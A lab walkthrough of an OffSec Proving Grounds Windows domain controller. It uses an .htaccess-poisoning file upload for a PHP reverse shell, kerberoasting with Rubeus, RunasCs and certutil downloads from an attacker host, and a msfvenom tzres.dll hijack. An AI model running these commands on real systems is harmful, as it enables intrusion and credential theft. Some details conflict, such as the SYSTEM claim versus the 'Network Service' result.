# Report - Access

- Author: Henry Post
- Target: Access
- Target IP: 192.168.51.187
- Attacker IP: 2.3.4.5
- Date: 03/01/2026

## Executive Summary

The target, `access`, was enumerated by `nmap` to have ports 443 open.

This port was running a website that had a file upload form that was used to poison the `.htaccess` file to allow a PHP reverse shell to be uploaded.

When we had reverse shell, we kerberoasted the `svc_mssql` to recover its password and get a reverse shell as that user. We use `RunasCs.exe` to  do this.

Then, we found we could load `C:\Windows\System32\wbem\tzres.dll` to get SYSTEM-level shell and used `msfvenom` to generate a malicious DLL. Then, we got SYSTEM shell.

### Recommendations

1. Do not allow arbitrary files to be uploaded. Do not allow users to specify their own filenames.
2. Do not allow the `.htaccess` file to be overwritten.

## Resources

- https://medium.com/@siberfaqih/offsec-proving-grounds-access-a-complete-writeup-walkthrough-12ad7f6bad6f

## Recon

```
???(kali?kali)-[~]
??$ nmap -sS -sV -p- access
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-06 19:16 +0000
Nmap scan report for access (192.168.51.187)
Host is up (0.00031s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-06 19:38:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 (OpenSSL/1.1.1k PHP/8.0.7)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: SERVER, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1375.04 seconds

```

So, this victim is a domain controller (kerberos), and it's running an HTTPS server.

```sh
netexec smb access
# SMB         192.168.79.187  445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:None)


```

So, our guide says we should use `ffuf` to find an `uploads` directory.

```sh
ffuf -u http://access/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fc 404,403
```

![](Pasted%20image%2020260707122955.png)

## Non-root access

Apparently there's a form where we can upload a PHP reverse shell.

Off to https://www.revshells.com/.

Okay, so `.php` is banned, let's try `.jpg`. `payload.jpg`.

Nope, that fails.

So our guide actually has us modify the `.htaccess` file with Burp Suite.

```txt
filename=".htaccess"

AddType application/x-httpd-php .php16
```

The original request:

![](Pasted%20image%2020260707125921.png)

Our modified one:

![](Pasted%20image%2020260707130123.png)

Now we can re-try our upload with the `.php16` file extension.

Then, we can visit http://access/uploads/payload.php16 .

```sh
# rev shell listener in separate terminal.
nc -nvlp 4444

curl http://access/uploads/payload.php16
```


![](Pasted%20image%2020260707130417.png)

We have non-root reverse shell. Hooray. Here's some proof:

![](Pasted%20image%2020260707130546.png)

Okay, windows wizardry time. Guide again.


```powershell
powershell.exe -ep bypass

#Build LDAP filter to look for users with SPN values registered for current domain  
$ldapFilter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"  
$domain = New-Object System.DirectoryServices.DirectoryEntry  
$search = New-Object System.DirectoryServices.DirectorySearcher  
$search.SearchRoot = $domain  
$search.PageSize = 1000  
$search.Filter = $ldapFilter  
$search.SearchScope = "Subtree"  
#Execute Search  
$results = $search.FindAll()  
#Display SPN values from the returned objects  
$Results = foreach ($result in $results)  
{  
 $result_entry = $result.GetDirectoryEntry()  
  $result_entry | Select-Object @{  
  Name = "Username";  Expression = { $_.sAMAccountName }  
 }, @{  
  Name = "SPN"; Expression = { $_.servicePrincipalName | Select-Object -First 1 }  
 }  
}  
$Results
```

```
PS C:\Users> $Results

Username  SPN                      
--------  ---                      
krbtgt    kadmin/changepw          
svc_mssql MSSQLSvc/DC.access.offsec
```

So apparently we need to kerberoast `svc_mssql`.

We'll be using a tool called "Rubeus" for that.

```sh
#(on kali)

wget https://github.com/meltingscales/Rubeus/raw/refs/heads/master/Rubeus.exe

ip a | grep 192 # 192.168.49.79

python3 -m http.server 80
```

```powershell
#(on victim)

cd C:\xampp\htdocs\uploads

certutil.exe -urlcache -f http://192.168.49.79:80/Rubeus.exe Rubeus.exe

.\Rubeus.exe kerberoast /outfile:kerberoast.hashes
```

![](Pasted%20image%2020260707132449.png)

It worked. Now to retrieve our hashes.

```sh
# on attacker

wget http://access/uploads/kerberoast.hashes
```

And now to crack them.

```sh
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

john kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt --show
```

![](Pasted%20image%2020260707132705.png)

The credential is `svc_mssql:trustno1`. Great.

Now we need to run a command as another user to get reverse shell as the `svc_mssql` user.

Victim:

```sh
#(on attacker)
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip

unzip RunasCs.zip
```

```powershell
#(on victim)
certutil.exe -urlcache -f http://192.168.49.79:80/RunasCs.exe RunasCs.exe

powershell.exe -ep bypass
```

```sh
#(on attacker)

nc -nvlp 443
```

```powershell
#(on victim)

.\RunasCs.exe svc_mssql trustno1 cmd.exe -r 192.168.49.79:443
```

This works!!

![](Pasted%20image%2020260707134848.png)

Now we have reverse shell as the `svc_mssql` user.

Now to run `whoami /priv`.

```cmd
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

We apparently have "SeManageVolumePrivilege" (even though it says disabled). I'm just going to keep following the guide.

```sh
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe

# as victim

cd ~

certutil.exe -urlcache -f http://192.168.49.79:80/SeManageVolumeExploit.exe SeManageVolumeExploit.exe

.\SeManageVolumeExploit.exe

```

> Using **dllref** by **Siren Security**, we identified that **tzres.dll** is associated with **systeminfo**. Normally, running **systeminfo**displays system details, but if we inject a malicious **tzres.dll**, we can hijack the process. This allows us to execute a **reverse shell**, leading to **privilege escalation** and higher system access.

## Root access

Okay, let's use `dllref`.

https://sirensecurity.io/blog/dllref/

So. `C:\Windows\System32\wbem\tzres.dll`...

```powershell
ls C:\Windows\System32\wbem\tzres.dll #file doesn't exist...
```

As attacker:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.79 LPORT=444 -f dll -o tzres.dll

# if it isn't already running...
python -m http.server 80
```

As victim:

```powershell
certutil.exe -urlcache -f http://192.168.49.79:80/tzres.dll tzres.dll

copy tzres.dll C:\Windows\System32\wbem\tzres.dll
```

As attacker:

```sh
nc -nvlp 444
```

As victim:

```powershell
systeminfo
```

![](Pasted%20image%2020260707153251.png)

We get "Network Service" user.

## Proof

### Local proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat local.txt`
(IMG_PLACEHOLDER)

### Root proof
![](Pasted%20image%2020260707153527.png)